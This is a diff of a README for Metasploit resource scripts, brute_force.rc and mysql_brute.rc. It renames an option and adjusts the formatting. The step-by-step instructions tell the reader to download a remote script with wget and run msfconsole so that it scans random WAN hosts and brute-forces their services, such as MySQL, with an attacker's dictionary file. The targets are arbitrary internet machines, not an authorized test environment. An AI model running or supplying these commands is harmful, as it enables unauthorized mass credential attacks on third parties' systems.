@@ -18,7 +18,7 @@
 `msfconsole -q -x 'hosts -d;services -d;exit -y'`<br /><br />
 
 - To continue populating database with scans, just instruct the rc script to not clean db (optional)<br />
-`msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg RANDOM 600;resource /root/brute_force.rc'`<br /><br />
+`msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg LIMMIT 600;resource /root/brute_force.rc'`<br /><br />
 
 - To export database contents to database.xml local folder before executing any rc script (optional)<br />
 `msfconsole -q -x 'db_export -f xml database.xml;exit -y'`<br /><br />
@@ -52,7 +52,7 @@
 
 - instruct the resource script to search in WAN for rhosts with service port open and limmit the search to 300 rhosts
 
-      msfconsole -q -x 'setg RANDOM_HOSTS true;setg RANDOM 300;resource /root/mysql_brute.rc'
+      msfconsole -q -x 'setg RANDOM_HOSTS true;setg LIMMIT 300;resource /root/mysql_brute.rc'
 
 - instruct the resource script to use attackers dicionary file (absoluct path required)
 
@@ -64,25 +64,25 @@
 
 - instruct the resource script to not clean database at exit, scan WAN for rhosts and limmit search to 600 rhosts
 
-      msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg RANDOM 600;resource /root/mysql_brute.rc'
+      msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg LIMMIT 600;resource /root/mysql_brute.rc'
 
 <br /><br /><br />
 
 #### Step-By-Step how to run brute_force.rc script
 
 - 1º download resource script to **/root** folder<br />
-`sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/brute_force.rc`
+`sudo wget https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/brute_force.rc`<br /><br />
 
 - 2º start postgresql service (**local**)<br />
-`sudo service postgresql start`
+`sudo service postgresql start`<br /><br />
 
 - 3º clean msfconsole database before runing rc script<br />
 `sudo msfconsole -q -x 'hosts -d;services -d;exit -y'`<br />
 **OR** export current database to database.xml (local)<br />
-`sudo msfconsole -q -x 'db_export -f xml database.xml;exit -y'`
+`sudo msfconsole -q -x 'db_export -f xml database.xml;exit -y'`<br /><br />
 
 - 4º run brute_force.rc resource script to search hosts on WAN<br />
-`sudo msfconsole -q -x 'setg RANDOM_HOSTS true;setg RANDOM 300;resource /root/brute_force.rc'`
+`sudo msfconsole -q -x 'setg RANDOM_HOSTS true;setg LIMMIT 300;resource /root/brute_force.rc'`<br /><br />
 
 <br />
 
@@ -91,12 +91,10 @@ cleans the database at exit, because at next time run if database contains any h
 will run the attacks againts database hosts (old hosts) and not the hosts found by current scans.
 
 - 5º To populate the database with scans, just instruct the rc script to not clean db (optional)<br />
-`msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg RANDOM 600;resource /root/brute_force.rc'`
+`msfconsole -q -x 'setg CLEAN false;setg RANDOM_HOSTS true;setg LIMMIT 600;resource /root/brute_force.rc'`<br /><br />
 
 - 6º To export database contents to database.xml local folder (optional)<br />
-`msf > db_export -f xml database.xml`
-
-![pic](http://i67.tinypic.com/2wfi88h.png)
+`msf > db_export -f xml database.xml`<br /><br />
 
 ### Suspicious Shell Activity RedTeam @2019
 
